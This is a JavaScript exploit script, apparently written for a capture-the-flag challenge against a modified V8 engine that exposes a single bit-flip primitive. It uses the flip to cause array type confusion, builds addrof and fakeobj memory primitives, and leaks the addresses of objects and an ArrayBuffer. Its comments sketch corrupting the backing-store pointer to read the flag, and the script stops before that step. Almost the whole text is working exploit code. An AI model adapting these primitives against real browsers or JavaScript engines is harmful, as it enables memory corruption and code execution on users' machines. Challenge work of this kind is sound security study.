// Butterfly Effect - Single bit flip exploit
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);

function d2u(d) {
    f64[0] = d;
    return u64[0];
}

function u2d(u) {
    u64[0] = u;
    return f64[0];
}

function hex(u) {
    return '0x' + u.toString(16).padStart(16, '0');
}

// Create arrays - we only get ONE chance
let victim_arr = [1.1, 2.2];
let leaker_arr = [{}, {}];

// The ONE bit flip we get - corrupt leaker_arr's map
// Flip bit 33 to change PACKED_ELEMENTS -> PACKED_DOUBLE_ELEMENTS
victim_arr.magic(victim_arr.length, 33);

console.log("Bit flipped. Testing type confusion...");
console.log("leaker_arr[0] type:", typeof leaker_arr[0]);
console.log("leaker_arr[0] value:", leaker_arr[0]);

// If successful, leaker_arr now interprets object pointers as doubles
if (typeof leaker_arr[0] === 'number') {
    console.log("SUCCESS! Type confusion achieved.");
    console.log("leaker_arr[0] as hex:", hex(d2u(leaker_arr[0])));
    
    // Set up addrof and fakeobj primitives
    function addrof(obj) {
        leaker_arr[0] = obj;
        return d2u(victim_arr[0]);
    }
    
    function fakeobj(addr) {
        victim_arr[0] = u2d(addr);
        return leaker_arr[0];
    }
    
    // Test addrof
    let test_obj = {marker: 0x1337};
    let addr = addrof(test_obj);
    console.log("addrof(test_obj) = " + hex(addr));
    
    // Now for the real exploit - try to read flag
    // We can try to find and corrupt ArrayBuffer backing store
    let ab = new ArrayBuffer(0x1000);
    let dv = new DataView(ab);
    let ab_addr = addrof(ab);
    console.log("ArrayBuffer address: " + hex(ab_addr));
    
    // Try to modify the ArrayBuffer's backing store pointer
    // to point to address 0 or known memory regions
    // This requires finding the right offset for the backing store pointer
    
} else {
    console.log("FAILED - Type confusion did not work");
    console.log("leaker_arr[0] is still:", leaker_arr[0]);
}
